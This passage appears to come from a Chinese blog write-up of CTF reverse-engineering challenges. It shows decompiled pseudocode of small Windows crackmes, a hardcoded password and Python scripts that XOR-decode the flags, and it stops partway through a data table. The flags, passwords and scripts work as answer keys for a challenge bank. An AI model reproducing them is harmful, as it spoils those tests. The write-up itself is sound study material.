)</span><br><span class="line">                  &#123;</span><br><span class="line">                    v13 = (v16 + <span class="number">14</span>) / <span class="number">2</span>;</span><br><span class="line">                    i = <span class="number">11</span> * (v13 / <span class="number">6</span>);</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( j != <span class="number">13</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  v12 = v16 + <span class="number">8</span>;</span><br><span class="line">                  v8 = <span class="number">2</span>;</span><br><span class="line">LABEL_51:</span><br><span class="line">                  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(enc[v12 - <span class="number">10</span>]);</span><br><span class="line">                    <span class="keyword">if</span> ( v8 == v12 )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v4 = v8 + <span class="number">2</span>;</span><br><span class="line">                      v5 = v12 + <span class="number">2</span>;</span><br><span class="line">                      <span class="built_in">putchar</span>(enc[v5 / <span class="number">2</span> + v4 / <span class="number">5</span>]);</span><br><span class="line">                      i = v4 / <span class="number">2</span>;</span><br><span class="line">                      <span class="built_in">putchar</span>(enc[i / <span class="number">5</span> + v5]);</span><br><span class="line">                      v13 = v5 + i - <span class="number">1</span> + v5;</span><br><span class="line">                      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">LABEL_33:</span><br><span class="line">                        <span class="built_in">putchar</span>(enc[v13 - <span class="number">19</span>]);</span><br><span class="line">                        <span class="keyword">if</span> ( i == <span class="number">2</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          v3 = v13 + <span class="number">1</span>;</span><br><span class="line">                          <span class="built_in">putchar</span>(enc[v3 / <span class="number">2</span> - <span class="number">3</span>]);</span><br><span class="line">                          v13 = v3 / <span class="number">5</span> + <span class="number">2</span>;</span><br><span class="line">                          i = <span class="number">2</span>;</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> ( i &lt;= <span class="number">2</span> )</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          v12 = v13 - <span class="number">31</span>;</span><br><span class="line">                          v8 = <span class="number">9</span>;</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_51;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> ( i != <span class="number">19</span> )</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">                        i = <span class="number">2</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">if</span> ( i == <span class="number">1</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        v8 = <span class="number">17</span>;</span><br><span class="line">                        v12 = v13 % <span class="number">5</span> - <span class="number">17</span> + v13;</span><br><span class="line">LABEL_20:</span><br><span class="line">                        <span class="built_in">putchar</span>(enc[v12 - v8 + <span class="number">9</span>]);</span><br><span class="line">                        v12 += ~v8++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( v8 != <span class="number">9</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( v8 != <span class="number">2</span> )</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">                    j = <span class="number">2</span>;</span><br><span class="line">                    v16 = v12 - <span class="number">18</span>;</span><br><span class="line">LABEL_64:</span><br><span class="line">                    v6 = <span class="number">9</span> * j;</span><br><span class="line">                    <span class="built_in">putchar</span>(enc[v16 / <span class="number">2</span> + v6 + v6 % <span class="number">10</span>]);</span><br><span class="line">                    m = v16 + <span class="number">1</span>;</span><br><span class="line">                    n = v6 % <span class="number">10</span>;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="built_in">putchar</span>(enc[v12 - <span class="number">16</span>]);</span><br><span class="line">                  v14 = v12 / <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( j == <span class="number">8</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v15 = v16 + <span class="number">1</span>;</span><br><span class="line">                  i = <span class="number">7</span>;</span><br><span class="line">                  <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_64;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v12 == <span class="number">7</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(enc[<span class="number">21</span> - v8]);</span><br><span class="line">            v13 = <span class="number">49</span>;</span><br><span class="line">            i = v8 / <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v8 != <span class="number">3</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">          <span class="built_in">putchar</span>(enc[<span class="number">2</span> * (v12 / <span class="number">3</span>)]);</span><br><span class="line">          v13 = v12 / <span class="number">3</span>;</span><br><span class="line">          i = <span class="number">9</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( v13 == <span class="number">10</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">putchar</span>(enc[i + <span class="number">8</span>]);</span><br><span class="line">                v14 = <span class="number">9</span>;</span><br><span class="line">                j = i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v13 == <span class="number">11</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">putchar</span>(enc[i / <span class="number">7</span>]);</span><br><span class="line">                v13 = i-- - <span class="number">11</span>;</span><br><span class="line">              &#125;</span><br><span class="line">LABEL_4:</span><br><span class="line">              <span class="keyword">if</span> ( i != <span class="number">9</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="built_in">putchar</span>(enc[v13 * v13 + <span class="number">7</span>]);</span><br><span class="line">              v13 = v13 * v13 + <span class="number">1</span>;</span><br><span class="line">              i = <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( i != <span class="number">13</span> );</span><br><span class="line">          <span class="built_in">putchar</span>(enc[<span class="number">2</span> * v13 + <span class="number">12</span>]);</span><br><span class="line">          v8 = <span class="number">3</span>;</span><br><span class="line">          v12 = <span class="number">3</span> * v13;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(enc[<span class="number">3</span> * v12 + <span class="number">1</span>]);</span><br><span class="line">        v0 = v12 * v12;</span><br><span class="line">        <span class="built_in">putchar</span>(enc[v0 - <span class="number">15</span>]);</span><br><span class="line">        m = v0 - <span class="number">15</span>;</span><br><span class="line">        n = <span class="number">4</span>;</span><br><span class="line">        <span class="built_in">putchar</span>(enc[<span class="number">4</span>]);</span><br><span class="line">LABEL_21:</span><br><span class="line">        <span class="keyword">if</span> ( n != <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">putchar</span>(enc[m + <span class="number">6</span>]);</span><br><span class="line">        v12 = m - <span class="number">3</span>;</span><br><span class="line">        v8 = <span class="number">3</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( n != <span class="number">8</span> );</span><br><span class="line">    <span class="built_in">putchar</span>(enc[<span class="number">2</span> * m + <span class="number">32</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Reverse02"><a href="#Reverse02" class="headerlink" title="Reverse02"></a>Reverse02</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file Reverse02.exe</span><br><span class="line">Reverse02.exe: PE32 executable (GUI) Intel 80386, for MS Windows</span><br></pre></td></tr></table></figure><p>定位到<code>MessageBoxA</code>，把这部分逆一下就完事了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+0h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+1h] [ebp-37h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Fh] [ebp-29h]</span></span><br><span class="line"></span><br><span class="line">  Dst = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  strncpy_s(&amp;Dst, <span class="number">0x31</span>u, <span class="string">"flag:&#123;NSCTF_md57e0cad17016b0&gt;?45?f7c&gt;0&gt;4a&gt;1c3a0&#125;"</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v0 = &amp;v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="string">'&#125;'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v0 ^= <span class="number">7u</span>;</span><br><span class="line">      ++v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *v0 != <span class="string">'&#125;'</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, &amp;Dst, <span class="string">"Flag"</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">enc = <span class="string">'7e0cad17016b0&gt;?45?f7c&gt;0&gt;4a&gt;1c3a0'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">flag += chr(ord(enc[i]) ^ <span class="number">7</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="Reverse-100"><a href="#Reverse-100" class="headerlink" title="Reverse 100"></a>Reverse 100</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file Reverse\ 100.exe</span><br><span class="line">Reverse 100.exe: PE32 executable (console) Intel 80386, for MS Windows</span><br></pre></td></tr></table></figure><p>main 函数看到有一个密码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> password; <span class="comment">// [esp+10h] [ebp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+11h] [ebp-103h]</span></span><br><span class="line"></span><br><span class="line">  password = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please input ns-ctf password: "</span>);</span><br><span class="line">  scanf_s(<span class="string">"%s"</span>, &amp;password);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; <span class="built_in">strncmp</span>(<span class="string">"nsF0cuS!x01"</span>, &amp;password, <span class="number">0xB</span>u); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"try again!\n"</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;password, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input ns-ctf password: "</span>);</span><br><span class="line">    scanf_s(<span class="string">"%s"</span>, &amp;password);</span><br><span class="line">  &#125;</span><br><span class="line">  dword_403368 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( &amp;password + <span class="built_in">strlen</span>(&amp;password) + <span class="number">1</span> != &amp;Dst )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      func();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag:&#123;NSCTF_md5065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340&#125;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现和前一题一模一样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Format; <span class="comment">// [esp+0h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+1h] [ebp-37h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Fh] [ebp-29h]</span></span><br><span class="line"></span><br><span class="line">  Format = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  strncpy_s(&amp;Format, <span class="number">0x31</span>u, <span class="string">"flag:&#123;NSCTF_md5065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340&#125;"</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v0 = &amp;v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">125</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v0 ^= <span class="number">7u</span>;</span><br><span class="line">      ++v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *v0 != <span class="number">125</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;Format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>异或一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">enc = <span class="string">'065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">flag += chr(ord(enc[i]) ^ <span class="number">7</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file 5.exe</span><br><span class="line">5.exe: PE32 executable (console) Intel 80386, for MS Windows</span><br></pre></td></tr></table></figure><p>用 OD 搜索字符串，定位关键函数：</p><p><img src="/pics/杭电CTF-题库-reverse/4.png" alt="关键函数"></p><p>在 IDA 里找到函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">sub_401000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">20</span>]; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">19</span>; ++i )</span><br><span class="line">    v1[i] = off_409030[<span class="number">47</span> * i % <span class="number">100</span>];</span><br><span class="line">  sub_401129((<span class="keyword">int</span>)&amp;unk_4092CC, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正向实现一下就行了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">table = [<span class="number">0x28</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x4F</span>, <span class="number">0x75</span>, <span class="number">0x68</span>, <span class="number">0x33</span>, <span class="number">0x6C</span>, <span class="number">0x31</span>, <span class="number">0x6A</span>, <span class="number">0x34</span>, <span class="number">0x68</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x76</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x28</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x62</span>, <span class="number">0x76</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x6B</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x5E</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x5E</span>, <span class="number">0x52</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x6A</span>, <span class="number">0x33</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x68</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x39</span>, <span class="number">0x48</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x48</span>, <span class="number">0x56</span>, <span class="number">0x28</span>, <span class="number">0x2A</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x69</span>, <span class="number">0x77</span>, <span class="number">0x75</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x32</span>, <span class="number">0x71</span>, <span class="number">0x33</span>, <span class="number">0x37</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x68</span>, <span class="number">0x71</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x66</span>, <span class="number">0x6A</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x48</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6E</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x6A</span>, <span class="number">0x68</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6B</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x6E</span>, <span class="number">0x49</span>, <span class="number">0x4F</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x59</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x4E</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x38</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x39</span>, <span class="number">0x68</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x42</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x36</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x2D</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x75</span>, <span class="number">0x6A</span>, <span class="number">0x6C</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x59</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x68</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x34</span>, <span class="number">0x72</span>, <span class="number">0x6E</span>, <span class="number">0x5B</span>, <span class="number">0x70</span>, <span class="number">0x39</span>, <span class="number">0x75</span>, <span class="number">0x64</span>, <span class="number">0x76</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x6D</span>, <span class="number">0x31</span>, <span class="number">0x70</span>, <span class="number">0x39</span>, <span class="number">0x79</span>, <span class="number">0x68</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x47</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x52</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x5E</span>, <span class="number">0x52</span>, <span class="number">0x46</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x4E</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0x6F</span>, <span class="number">0x34</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x76</span>, <span class="number">0x63</span>, <span class="number">0x33</span>, <span class="number">0x6F</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x34</span>, <span class="number">0x39</span>, <span class="number">0x26</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x7A</span>, <span class="number">0x78</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x34</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x4B</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x64</span>, <span class="number">0x75</span>, <span class="number">0x79</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x32</span>, <span class="number">0x77</span>, <span class="number">0x6A</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x76</span>, <span class="number">0x70</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x75</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x2D</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x38</span>, <span class="number">0x75</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x6B</span>, <span class="number">0x73</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x79</span>, <span class="number">0x39</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x6E</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x38</span>, <span class="number">0x79</span>, <span class="number">0x66</span>, <span class="number">0x70</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x34</span>, <span 